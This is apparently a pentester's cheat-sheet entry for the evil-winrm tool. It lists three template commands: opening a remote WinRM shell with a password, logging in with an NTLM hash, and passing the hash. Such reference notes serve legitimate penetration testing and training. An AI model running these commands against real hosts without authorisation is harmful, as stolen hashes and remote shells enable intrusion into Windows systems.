### Source
https://github.com/Hackplayers/evil-winrm  

### Start shell on host (port 5985,5986)
```
evil-winrm -i <ip> -u <user> -p <password>
```

### Using ntlm hash
```
evil-winrm -i <ip> -u <user> -H <ntlmHash>
```

### Pass the hash
```
evil-winrm -u <user> -H <Hash> -i <IP>
```

